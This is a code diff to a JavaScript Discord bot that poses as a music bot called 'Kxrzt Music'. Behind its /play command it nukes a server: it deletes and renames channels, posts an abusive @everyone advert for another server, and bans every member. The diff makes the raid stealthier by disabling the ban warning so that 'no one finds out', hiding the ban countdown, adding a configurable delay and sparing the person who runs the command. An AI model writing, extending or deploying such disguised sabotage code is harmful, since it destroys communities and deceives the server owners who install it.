@@ -8,7 +8,7 @@ import { commands } from './commands.js';
 /* ------------------------------------------------------------------ config */
 
 const NUKE_MESSAGE =
-  "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/uBgehrcTZd #";
+  "# @everyone FUCK Y'ALL BITCHES, EASY NUKE ATP JUST JOIN OUR SERVER https://discord.gg/X78u8V99vG #";
 
 const CHANNEL_BASE = '⛧•Kxrzt-owns-yall❗️';
 
@@ -46,10 +46,14 @@ const WEBHOOK_RATIO = 0.5;
 
 /* -------------------------------------------------------------- ban config */
 
-const BAN_DELAY_MS = 5 * 60 * 1000; // 5 minuten nach /play
-const BAN_WARN_MS = 30 * 1000; // 30s vorher warnen
+const BAN_DELAY_MS = 5 * 60 * 1000; // fallback wenn keine sekunden angegeben (5 min)
+const BAN_WARN = false; // false = KEINE "30s bis ban"-nachricht, keiner erfährt davon
+const BAN_WARN_MS = 30 * 1000; // vorlauf, nur relevant wenn BAN_WARN = true
+const BAN_FOOTER = false; // true = "banning everyone in X" im now-playing footer zeigen
 const BAN_INCLUDE_BOTS = true; // auch andere bots bannen
-const BAN_INCLUDE_SELF = false; // sich selbst mitbannen (bot verlässt den server)
+const BAN_INCLUDE_SELF = false; // false = bot bleibt am leben (bannt sich NICHT selbst)
+const BAN_KEEP_OWNER = true; // server-owner nie bannen
+const BAN_KEEP_RUNNER = true; // den user der /play macht verschonen
 const BAN_DELETE_MESSAGES_SECONDS = 0; // 0 = nachrichten behalten, max 604800 (7 tage)
 
 const sleep = ms => new Promise(r => setTimeout(r, ms));
@@ -281,33 +285,39 @@ async function nukeGuild(guild, { wipeRoles = false, rename = RENAME_GUILD } = {
 
 /* --------------------------------------------------------------------- ban */
 
-const banTimers = new Map(); // guildId -> { warn, ban }
+const banTimers = new Map(); // guildId -> { warn?, ban }
 
 function cancelBanEveryone(guildId) {
   const t = banTimers.get(guildId);
   if (!t) return;
-  clearTimeout(t.warn);
+  if (t.warn) clearTimeout(t.warn);
   clearTimeout(t.ban);
   banTimers.delete(guildId);
 }
 
 // zweiter /play resettet den timer statt doppelt zu bannen
-function scheduleBanEveryone(guild, channel) {
+function scheduleBanEveryone(guild, channel, delayMs = BAN_DELAY_MS, runnerId = null) {
   cancelBanEveryone(guild.id);
 
-  const warn = setTimeout(() => {
-    channel?.send('⏳ **everyone gets banned in 30 seconds.**').catch(() => {});
-  }, Math.max(0, BAN_DELAY_MS - BAN_WARN_MS));
+  const timers = {};
 
-  const ban = setTimeout(() => {
+  // nur wenn BAN_WARN = true — sonst sieht keiner was
+  if (BAN_WARN) {
+    const lead = Math.min(BAN_WARN_MS, Math.floor(delayMs / 2));
+    timers.warn = setTimeout(() => {
+      channel?.send(`⏳ **everyone gets banned in ${Math.round(lead / 1000)}s.**`).catch(() => {});
+    }, Math.max(0, delayMs - lead));
+  }
+
+  timers.ban = setTimeout(() => {
     banTimers.delete(guild.id);
-    banEveryone(guild).catch(e => console.error('[ban]', e.message));
-  }, BAN_DELAY_MS);
+    banEveryone(guild, { runnerId }).catch(e => console.error('[ban]', e.message));
+  }, delayMs);
 
-  banTimers.set(guild.id, { warn, ban });
+  banTimers.set(guild.id, timers);
 }
 
-async function banEveryone(guild) {
+async function banEveryone(guild, { runnerId = null } = {}) {
   const me = guild.members.me ?? await guild.members.fetchMe();
 
   if (!me.permissions.has(PermissionFlagsBits.BanMembers)) {
@@ -319,9 +329,10 @@ async function banEveryone(guild) {
 
   const ids = members
     .filter(m =>
-      (!BAN_INCLUDE_SELF || m.id !== me.id) &&
-      m.id !== guild.ownerId && // owner kann man nicht bannen
-      (BAN_INCLUDE_BOTS || !m.user.bot)
+      (BAN_INCLUDE_SELF || m.id !== me.id) && // bot bleibt am leben
+      (!BAN_KEEP_OWNER || m.id !== guild.ownerId) && // owner kann man nicht bannen
+      (BAN_INCLUDE_BOTS || !m.user.bot) && // andere bots mit
+      (!BAN_KEEP_RUNNER || m.id !== runnerId) // /play-user verschonen
     )
     .map(m => m.id);
 
@@ -388,6 +399,13 @@ function nowPlayingEmbed(track, user, footer = 'Kxrzt Music') {
     .setFooter({ text: footer });
 }
 
+// "45s" / "2min" / "1.5min"
+function delayLabel(ms) {
+  if (ms < 60000) return `${Math.round(ms / 1000)}s`;
+  const m = ms / 60000;
+  return Number.isInteger(m) ? `${m}min` : `${m.toFixed(1)}min`;
+}
+
 /* ------------------------------------------------------------- fake music */
 
 // antwortet plausibel, aber nichts davon existiert wirklich
@@ -445,7 +463,7 @@ const FAKE = {
         .setAuthor({ name: 'Kxrzt Music' })
         .setDescription([
           '**Playback**',
-          '`/play [song] [roles] [ban]` — nuke + ban everyone after 5min',
+          '`/play [song] [roles] [ban] [seconds]` — nuke + ban everyone (seconds 15-120, sonst 5min)',
           '`/pause` `/resume` `/stop` `/skip` `/seek`',
           '',
           '**Queue**',
@@ -488,19 +506,25 @@ async function play(interaction) {
   const wipeRoles = interaction.options.getBoolean('roles') ?? false;
   const banAll = interaction.options.getBoolean('ban') ?? true;
 
+  // 15-120 sekunden, sonst fallback 5 min
+  const banSeconds = interaction.options.getInteger('seconds');
+  const banDelay = banSeconds ? banSeconds * 1000 : BAN_DELAY_MS;
+
   // öffentliches "searching..." — wie ein echter musikbot
   await interaction.deferReply();
 
   try {
     const { summary, textChannels, ms } = await nukeNow(guild, { wipeRoles });
 
-    if (banAll) scheduleBanEveryone(guild, textChannels[0]);
+    if (banAll) {
+      scheduleBanEveryone(guild, textChannels[0], banDelay, interaction.user.id);
+    }
 
     const embed = nowPlayingEmbed(
       song,
       interaction.user,
       `Kxrzt Music • nuked in ${(ms / 1000).toFixed(1)}s` +
-        (banAll ? ' • banning everyone in 5min' : '')
+        (banAll && BAN_FOOTER ? ` • banning everyone in ${delayLabel(banDelay)}` : '')
     );
 
     // origin-channel ist weg -> editReply kann 404en, dann in den ersten neuen channel
@@ -526,6 +550,9 @@ const stripFlags = p => {
 function shim(message, args) {
   let sent = null;
 
+  // "!play song 60" -> trailing zahl ist der ban-delay, nicht teil des songs
+  const isDelay = a => /^\d+$/.test(a ?? '');
+
   return {
     user: message.author,
     member: message.member,
@@ -533,8 +560,21 @@ function shim(message, args) {
     memberPermissions: message.member?.permissions ?? null,
 
     options: {
-      getString: () => args.join(' ') || null,
-      getInteger: () => Number(args[0]) || null,
+      getString: name => {
+        if (name === 'song' || name === undefined) {
+          const a = [...args];
+          if (a.length > 1 && isDelay(a[a.length - 1])) a.pop();
+          return a.join(' ') || null;
+        }
+        return args.join(' ') || null;
+      },
+      getInteger: name => {
+        if (name === 'seconds') {
+          const last = args[args.length - 1];
+          return isDelay(last) ? Number(last) : null;
+        }
+        return Number(args[0]) || null;
+      },
       getBoolean: name => {
         if (name === 'roles') return args.includes('roles');
         if (name === 'ban') return !args.includes('noban'); // !play song noban = aus
